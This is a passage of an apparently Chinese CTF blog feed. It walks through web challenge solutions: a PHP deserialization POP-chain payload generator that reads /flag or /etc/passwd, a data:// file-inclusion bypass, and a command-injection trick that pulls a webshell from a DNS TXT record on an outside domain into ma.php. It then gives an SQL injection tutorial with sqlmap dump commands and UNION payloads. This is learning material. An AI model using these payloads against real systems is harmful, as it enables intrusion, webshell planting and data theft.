对象。<code>md5</code> 函数需要字符串，因此调用 <code>Pr0</code> 对象的 <code>__toString</code> 方法。</li><li><strong>链接着 (<code>ziran-&gt;__call</code>)</strong>: 在 <code>Pr0-&gt;__toString</code> 中，代码尝试调用 <code>$this-&gt;username-&gt;flag1()</code>。<code>flag1</code> 方法不存在，所以会触发 <code>$this-&gt;username</code> 对象的 <code>__call</code> 方法。我们让 <code>$this-&gt;username</code> 指向一个 <code>ziran</code> 对象。</li><li><strong>链接着 (<code>cos1ne-&gt;__call</code>)</strong>: 在 <code>ziran-&gt;__call</code> 中，代码调用 <code>$this-&gt;data-&gt;flag2()</code>。<code>flag2</code> 方法不存在，所以会触发 <code>$this-&gt;data</code> 对象的 <code>__call</code> 方法。我们让 <code>$this-&gt;data</code> 指向一个 <code>cos1ne</code> 对象。</li><li><strong>链接着 (<code>yi-&gt;__invoke</code>)</strong>: 在 <code>cos1ne-&gt;__call</code> 中，代码检查 <code>$this-&gt;role</code> 是否是可调用的，并执行它。我们让 <code>$this-&gt;role</code> 指向一个 <code>yi</code> 对象。将对象当作函数调用会触发其 <code>__invoke</code> 方法。</li><li><strong>终点 (<code>Acc1o-&gt;Acc1oFl4g</code>)</strong>: 在 <code>yi-&gt;__invoke</code> 中，代码调用 <code>$this-&gt;username-&gt;Acc1oFl4g()</code>。我们让 <code>$this-&gt;username</code> 指向我们最初的那个 <code>Acc1o</code> 对象（或者另一个配置好的 <code>Acc1o</code> 对象）。这个方法会读取 <code>$key</code> 文件。</li></ol><p><strong>链条总结：</strong><code>Acc1o-&gt;__destruct</code> -&gt; <code>Pr0-&gt;__toString</code> -&gt; <code>ziran-&gt;__call</code> -&gt; <code>cos1ne-&gt;__call</code> -&gt; <code>yi-&gt;__invoke</code> -&gt; <code>Acc1o-&gt;Acc1oFl4g</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Acc1o</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yi</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cos1ne</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ziran</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$role</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$data</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$temp</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pr0</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>&#125;<br><br><span class="hljs-comment">// 创建 Acc1o 主实例</span><br><span class="hljs-variable">$acc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Acc1o</span>(<span class="hljs-string">&quot;user&quot;</span>);<br><span class="hljs-variable">$acc</span>-&gt;key = <span class="hljs-string">&quot;/flag&quot;</span>; <span class="hljs-comment">// 或 &quot;/etc/passwd&quot; 测试</span><br><br><span class="hljs-comment">// 创建 yi，引用同一个 $acc</span><br><span class="hljs-variable">$y</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">yi</span>();<br><span class="hljs-variable">$y</span>-&gt;username = <span class="hljs-variable">$acc</span>;<br><br><span class="hljs-comment">// cos1ne -&gt; role = yi</span><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cos1ne</span>();<br><span class="hljs-variable">$c</span>-&gt;role = <span class="hljs-variable">$y</span>;<br><br><span class="hljs-comment">// ziran -&gt; data = cos1ne</span><br><span class="hljs-variable">$z</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ziran</span>();<br><span class="hljs-variable">$z</span>-&gt;data = <span class="hljs-variable">$c</span>;<br><br><span class="hljs-comment">// Pr0 -&gt; username = ziran</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pr0</span>();<br><span class="hljs-variable">$p</span>-&gt;username = <span class="hljs-variable">$z</span>;<br><span class="hljs-variable">$p</span>-&gt;password = <span class="hljs-string">&quot;123&quot;</span>;<br><br><span class="hljs-comment">// 关键：Acc1o-&gt;data = Pr0，这样 __destruct 时会触发 __toString</span><br><span class="hljs-variable">$acc</span>-&gt;data = <span class="hljs-variable">$p</span>;<br><br><span class="hljs-comment">// 序列化主对象</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$acc</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Payload:\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span> . <span class="hljs-string">&quot;\n\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;URL Encoded:\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$payload</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><h4 id="参考文献-4"><a href="#参考文献-4" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="/html/phpfanxulie.html">反序列化漏洞详解</a></p><h1 id="fuzzing-what？"><a href="#fuzzing-what？" class="headerlink" title="fuzzing what？"></a>fuzzing what？</h1><p>根据题目名称应该是要进行爆破</p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts/tree/master">TheKingOfDuck&#x2F;fuzzDicts: You Know, For WEB Fuzzing ! 日站用的字典。</a></p><p>参数爆破 filename&#x3D;1时获得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>) === <span class="hljs-string">&#x27;hello, hacker&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/hello, hacker/&#x27;</span>, <span class="hljs-variable">$a</span>)) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$b</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;no you r not hacker&#x27;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;what?&#x27;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当<code>!preg_match(&#39;/hello, hacker/&#39;, $a)</code> 时触发文件包含漏洞，但前面对a进行了正则过滤</p><p><code>data://</code> 伪协议允许你在 URL 中直接嵌入数据。当 <code>file_get_contents</code> 读取它时，它会将嵌入的数据作为文件内容返回。</p><p><code>a=data://text/plain;base64,aGVsbG8sIGhhY2tlcg==</code> </p><h1 id="ez-blog"><a href="#ez-blog" class="headerlink" title="ez_blog"></a>ez_blog</h1><p><img src="https://pic1.imgdb.cn/item/693e2078fe7cfeca3824ad63.jpg"></p><h4 id="参考文献-5"><a href="#参考文献-5" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="/html/userini.html">CTF之文件上传（.user.ini）_ctf web2-CSDN博客</a></p><h1 id="移花-challenge"><a href="#移花-challenge" class="headerlink" title="移花_challenge"></a>移花_challenge</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$Pr0</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Pr0&#x27;</span>];<br><span class="hljs-variable">$mode</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;mode&#x27;</span>] ?? <span class="hljs-string">&#x27;ping&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpbrk</span>(<span class="hljs-variable">$Pr0</span>, <span class="hljs-string">&quot;&amp;;`|*?()$\\\x00&quot;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;这个不可以哦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$Pr0</span>, <span class="hljs-string">&#x27;.php&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;这个也不可以哦~&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$Pr0</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$Pr0</span>);<br><span class="hljs-variable">$Pr0</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&gt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-variable">$Pr0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> === <span class="hljs-string">&#x27;nslookup&#x27;</span>) &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;nslookup &quot;</span> . <span class="hljs-variable">$Pr0</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;ping -c1 &quot;</span> . <span class="hljs-variable">$Pr0</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>有nslookup和ping两种模式，执行Pr0中的参数，但是对Pr0进行了十分严格的过滤。</p><p>首先试试命令拼接，虽然特殊符号被过滤了，但是可以尝试用%0a和%0d分隔命令，不过实测不行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$Pr0</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$Pr0</span>);<br><span class="hljs-variable">$Pr0</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&gt;&#x27;</span>, <span class="hljs-string">&#x27;&gt;&#x27;</span>, <span class="hljs-variable">$Pr0</span>);<br></code></pre></td></tr></table></figure><p>再分析这段代码，题目保留了&gt;,允许我们将命令执行的结果重定向到一个文件(但不允许.php)。</p><p>那么重定向的意义是什么，怎么才能执行我想要的命令？思路断了</p><p>后续我又结合nslookup的特性尝试了dnslog外带，不过还是因特殊字符过滤而失败。</p><p>后来后来，一道远程文件包含的题目给了我思路，有没有办法让ping或者nslookup的结果里带有一句话木马？</p><p>只要在域名的解析中添加一条TXT记录就行了！</p><p><img src="https://pic1.imgdb.cn/item/6933821dd1e741a32bf5e44a.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://175.27.251.122:33640/?mode=nslookup&amp;Pr0=-type=TXT%20webattacktest.libfsx.org<br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/6933829dd1e741a32bf5e7a1.png"></p><p>下一步绕过.php过滤，重定向到ma.php文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">http://175.27.251.122:33640/?mode=nslookup&amp;Pr0=-type=TXT%20webattacktest.libfsx.org%3Ema.p%27%27hp<br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/693382f0d1e741a32bf5e9cd.png"></p><p>成功！</p><h4 id="参考文献-6"><a href="#参考文献-6" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="https://www.cnblogs.com/EddieMurphy-blogs/p/17705836.html">nmap和escapeshellarg()函数、escapeshellcmd()函数的RCE使用</a></p><p><a href="https://blog.csdn.net/m0_73512445/article/details/134873251">PHP escapeshellarg()+escapeshellcmd()绕过</a></p><p><a href="/html/dnslog.html">DNSlog外带</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入</title>
    <link href="/2025/11/15/SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2025/11/15/SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="一、SQL-注入基础"><a href="#一、SQL-注入基础" class="headerlink" title="一、SQL 注入基础"></a>一、SQL 注入基础</h2><p><strong>核心原理</strong>：用户输入未经过滤直接拼接到 SQL 语句中，导致恶意代码被执行。  </p><p><strong>CTF 常见注入类型</strong>：</p><ul><li><strong>联合查询注入（UNION）</strong></li><li><strong>布尔盲注</strong></li><li><strong>时间盲注</strong></li><li><strong>报错注入</strong></li><li><strong>堆叠查询注入</strong></li><li><strong>宽字节注入</strong></li><li><strong>二次注入</strong></li></ul><p><strong>常见注入点</strong></p><ul><li><strong>GET 参数</strong>：<code>http://example.com/page.php?id=1</code></li><li><strong>POST 参数</strong>：登录框、搜索框、留言板等表单提交的参数。</li><li><strong>Cookie</strong>：<code>Cookie: user=admin; session=abc123</code></li><li><strong>HTTP 头部</strong>：<code>User-Agent</code>, <code>Referer</code>, <code>X-Forwarded-For</code> 等。</li></ul><h2 id="二、SQLmap-自动注入快速上手"><a href="#二、SQLmap-自动注入快速上手" class="headerlink" title="二、SQLmap 自动注入快速上手"></a>二、SQLmap 自动注入快速上手</h2><h4 id="关键参数说明"><a href="#关键参数说明" class="headerlink" title="关键参数说明"></a>关键参数说明</h4><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td><code>-u</code></td><td>指定目标 URL</td></tr><tr><td><code>-r</code></td><td>加载 HTTP 请求文件（Burp 抓包保存为 <code>.txt</code>）</td></tr><tr><td><code>-p</code></td><td>指定测试的参数（如 <code>id</code>、<code>username</code>）</td></tr><tr><td><code>--dbs</code></td><td>列出所有数据库</td></tr><tr><td><code>-D &lt;db&gt;</code></td><td>指定数据库</td></tr><tr><td><code>--tables</code></td><td>列出指定数据库的所有表</td></tr><tr><td><code>-T &lt;table&gt;</code></td><td>指定表</td></tr><tr><td><code>--columns</code></td><td>列出指定表的所有字段</td></tr><tr><td><code>-C &lt;columns&gt;</code></td><td>指定字段（多个用逗号分隔）</td></tr><tr><td><code>--dump</code></td><td>导出指定字段的数据</td></tr><tr><td><code>--current-db</code></td><td>获取当前数据库名</td></tr><tr><td><code>--current-user</code></td><td>获取当前数据库用户</td></tr><tr><td><code>--technique</code></td><td>指定注入技术（如 <code>B</code> 布尔盲注，<code>T</code> 时间盲注，<code>U</code> 联合查询）</td></tr><tr><td><code>--time-sec</code></td><td>时间盲注时的延迟时间（默认 5 秒）</td></tr><tr><td><code>--tamper</code></td><td>使用脚本绕过 WAF（如 <code>space2comment</code> 替换空格为注释）</td></tr><tr><td><code>--threads</code></td><td>多线程（默认 1，CTF 中建议 1-5 避免触发防护）</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 --current-db<br><br>python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli --tables<br><br>python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag --columns<br><br>python sqlmap.py -u http://challenge-07d7ae9cbbdb5f5e.sandbox.ctfhub.com:10800/?id=1 -D sqli -T flag -C flag --dump<br></code></pre></td></tr></table></figure><p>依次为查询最近使用的数据库，查询表，查询字段，转存数据</p><h3 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h3><h4 id="场景-1：GET-参数注入"><a href="#场景-1：GET-参数注入" class="headerlink" title="场景 1：GET 参数注入"></a>场景 1：GET 参数注入</h4><p><strong>示例 URL</strong>：<code>http://ctf.example.com/web1/?id=1</code>  </p><p><strong>操作流程</strong>：</p><ol><li><p><strong>检测注入点</strong>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span><br></code></pre></td></tr></table></figure></li><li><p><strong>获取数据库</strong>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> --dbs<br></code></pre></td></tr></table></figure></li><li><p><strong>获取表和字段</strong>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> -D ctf_db --tables<br>python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> -D ctf_db -T flag --columns<br></code></pre></td></tr></table></figure></li><li><p><strong>导出数据</strong>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web1/?id=1&quot;</span> -D ctf_db -T flag -C flag --dump<br></code></pre></td></tr></table></figure></li></ol><h4 id="场景-2：POST-表单注入"><a href="#场景-2：POST-表单注入" class="headerlink" title="场景 2：POST 表单注入"></a>场景 2：POST 表单注入</h4><p><strong>示例</strong>：登录表单（<code>username</code> 和 <code>password</code> 参数）  </p><p><strong>操作流程</strong>：</p><ol><li><p><strong>Burp 抓包并保存为</strong> <strong><code>request.txt</code></strong>：</p> <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ctf.example.com<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>31<br><br><span class="language-ini"><span class="hljs-attr">username</span>=admin&amp;password=<span class="hljs-number">123456</span></span><br></code></pre></td></tr></table></figure></li><li><p><strong>SQLmap 检测</strong>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r request.txt -p username  <span class="hljs-comment"># 指定测试 username 参数</span><br></code></pre></td></tr></table></figure></li><li><p><strong>后续操作同 GET 注入</strong>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r request.txt -p username --dbs<br><span class="hljs-comment"># ... 导出 flag</span><br></code></pre></td></tr></table></figure></li></ol><h4 id="场景-3：布尔盲注（无回显）"><a href="#场景-3：布尔盲注（无回显）" class="headerlink" title="场景 3：布尔盲注（无回显）"></a>场景 3：布尔盲注（无回显）</h4><p><strong>特征</strong>：页面无报错，仅根据输入返回“正常”或“异常”（如登录成功&#x2F;失败）  </p><p><strong>操作流程</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># 指定布尔盲注技术</span><br>python sqlmap.py -r request.txt -p username --technique B --dbs<br><span class="hljs-comment"># 导出数据（较慢，耐心等待）</span><br>python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump<br></code></pre></td></tr></table></figure><h4 id="场景-4：时间盲注（无回显）"><a href="#场景-4：时间盲注（无回显）" class="headerlink" title="场景 4：时间盲注（无回显）"></a>场景 4：时间盲注（无回显）</h4><p><strong>特征</strong>：页面无任何差异，需通过响应时间判断  </p><p><strong>操作流程</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># 指定时间盲注技术，设置延迟 3 秒</span><br>python sqlmap.py -r request.txt -p username --technique T --time-sec 3 --dbs<br><span class="hljs-comment"># 导出数据（非常慢，可适当调大 threads）</span><br>python sqlmap.py -r request.txt -p username -D ctf_db -T flag -C flag --dump --threads 3<br></code></pre></td></tr></table></figure><h4 id="场景-5：宽字节注入（GBK-编码）"><a href="#场景-5：宽字节注入（GBK-编码）" class="headerlink" title="场景 5：宽字节注入（GBK 编码）"></a>场景 5：宽字节注入（GBK 编码）</h4><p><strong>特征</strong>：后端使用 <code>addslashes()</code> 或 <code>mysql_real_escape_string()</code> 过滤，但数据库为 GBK 编码  </p><p><strong>操作流程</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Bash"><span class="hljs-comment"># 使用 tamper 脚本绕过</span><br>python sqlmap.py -u <span class="hljs-string">&quot;http://ctf.example.com/web5/?id=1&quot;</span> --tamper=gbkencode --dbs<br></code></pre></td></tr></table></figure><h4 id="场景-6：二次注入"><a href="#场景-6：二次注入" class="headerlink" title="场景 6：二次注入"></a>场景 6：二次注入</h4><p><strong>特征</strong>：注入点不在初始输入，而在后续读取存储数据时触发（如注册用户名后登录）  </p><p><strong>操作流程</strong>：</p><ol><li><p><strong>注册恶意用户名</strong>：<code>admin&#39; --</code>  </p></li><li><p>**Burp 抓包登录请求并保存为 ** <strong><code>login.txt</code></strong>  </p></li><li><p><strong>SQLmap 检测登录请求中的 ** <strong><code>username</code></strong> ** 参数</strong>：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Bash">python sqlmap.py -r login.txt -p username --dbs<br></code></pre></td></tr></table></figure></li></ol><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://blog.csdn.net/qq_44005305/article/details/146025669">sqlmap常用命令整理</a></p><h2 id="三、SQL语法"><a href="#三、SQL语法" class="headerlink" title="三、SQL语法"></a>三、SQL语法</h2><p><code>show tables</code>查询所有表，可以看到flag表</p><p><code>show columns from flag</code>查询flag表的所有字段</p><table><thead><tr><th align="left">列名</th><th></th></tr></thead><tbody><tr><td align="left">Field</td><td>列的名称。这是表中定义的列标识符。例如，如果表中有一个存储用户名的列，这里会显示相应的列名，如 <code>username</code></td></tr><tr><td align="left">Type</td><td>列的数据类型。表明该列可以存储的数据类型，如 <code>INT</code>（整数类型）、<code>VARCHAR(255)</code>（可变长度字符串，最大长度为 255）、<code>DATE</code>（日期类型）等</td></tr><tr><td align="left">Null</td><td>表示该列是否允许存储 <code>NULL</code> 值。如果显示 <code>YES</code>，则该列可以接受 <code>NULL</code>；如果显示 <code>NO</code>，则不允</td></tr><tr><td align="left">Key</td><td>显示该列是否被定义为键（如主键 <code>PRI</code>、唯一键 <code>UNI</code> 等）。如果是主键列，这里会显示 <code>PRI</code></td></tr><tr><td align="left">Default</td><td>列的默认值。如果在创建表时为该列设置了默认值，这里会显示出来。例如，若某列默认值为 <code>0</code>，则会在此处显示 <code>0</code>。如果没有设置默认值，可能显示为 <code>NULL</code> 或空白</td></tr><tr><td align="left">Extra</td><td>提供关于该列的额外信息。例如，对于自增长列，这里可能显示 <code>auto_increment</code></td></tr></tbody></table><p>union可以将两个select语句的结果合并到一个结果集中，但要求两个select语句有相同的列数</p><p>拼接后的语句：<code>select username from users where id=0 union select password from users</code></p><p><code>order by</code> 关键字用于对结果集按照一个列或者多个列进行排序，我们可以利用二分法联合查询字段数</p><p>SELECT 语句用于从数据库中选取数据</p><p><code>SELECT column1, column2, ... FROM table_name;</code> </p><p>WHERE 子句用于提取那些满足指定条件的记录</p><p><code>SELECT column1, column2, ... FROM table_name WHERE condition;</code> </p><p>LIMIT 子句用于控制查询的列</p><p><code>SELECT column1, column2, ... FROM table_name LIMIT 3;</code>  返回前 3 行数据</p><p><code>select database()</code>可以用来获取当前数据库的名字</p><p>使用<code>union select</code>语句，结合<code>information_schema</code>系统表，获取表名和列名</p><p><code>select  group_concat(table_name) from information_schema.tables where table_schema=database()</code></p><p>查询字段 <code>select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;</code></p><p>查询值 <code>select 1,group_concat(flag) from sqli.flag</code></p><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>用<code>/**/</code> 代替</p><h2 id="四、简单的SQL注入"><a href="#四、简单的SQL注入" class="headerlink" title="四、简单的SQL注入"></a>四、简单的SQL注入</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" 